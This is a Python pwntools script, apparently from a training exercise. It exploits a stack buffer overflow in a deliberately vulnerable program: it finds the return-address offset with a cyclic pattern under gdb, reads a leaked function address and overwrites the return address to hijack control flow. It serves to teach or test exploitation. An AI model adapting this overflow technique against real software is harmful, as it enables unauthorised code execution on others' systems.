from pwn import *
import subprocess
import re
import sys
import os

def get_leaked_address(output):
    # Find leaked f() pointer in program output
    match = re.search(rb'Leaked f\(\) address: (0x[0-9a-fA-F]+)', output)
    if not match:
        log.error("Failed to find leaked address of f()")
    return int(match.group(1), 16)

def get_overwritten_return(vulnerable_executable, pattern):
    with open("input.txt", "wb") as f:
        f.write(pattern)

    gdbscript = f"""
    set pagination off
    run < input.txt
    x/gx $rsp
    quit
    """

    result = subprocess.check_output(
        ['gdb', '-q', vulnerable_executable],
        input=gdbscript.encode(),
        stderr=subprocess.DEVNULL
    )

    log.info(f"GDB's output: \n{result.decode('utf-8')}")

    match = re.search(rb':\t0x([0-9a-fA-F]{8,16})', result)
    addr = int(match.group(1), 16)
    log.info(f"Overwritten return address: 0x{addr:x}")

    os.remove("input.txt")
    return p64(addr)

def find_offset(vulnerable_executable):
    pattern_len = 100

    log.info("Crashing binary with cyclic pattern to find offset...")
    pattern = cyclic(pattern_len)

    overwritten = get_overwritten_return(vulnerable_executable, pattern)
    found_offset = cyclic_find(overwritten)
    log.success(f"Found offset: {found_offset}")
    return found_offset
    

def run_final_exploit(vulnerable_executable, offset):
    log.info("Building final payload...")

    p = process(vulnerable_executable)
    leaked = p.recvline_contains(b"Leaked f() address:")
    f_addr = get_leaked_address(leaked)
    log.success(f"Leaked f() address: 0x{f_addr:x}")
    payload = b"A" * offset + p64(f_addr)

    p.sendline(payload)
    output = p.recvall(timeout=1).decode()
    p.wait()

    log.info(f"vulnerable.exe output: \n{output}")
    return int("Hijacked" not in output)

# ---------- Main ----------
debug_point = 1
if len(sys.argv) == 1:
    print("Usage: python exploit.py <path_to_vulnerable_executable>")
    sys.exit(1)
vulnerable_executable = sys.argv[1]

# Step 1: Find offset
offset = find_offset(vulnerable_executable)

# Step 2: Exploit with f()
sys.exit(run_final_exploit(vulnerable_executable, offset))
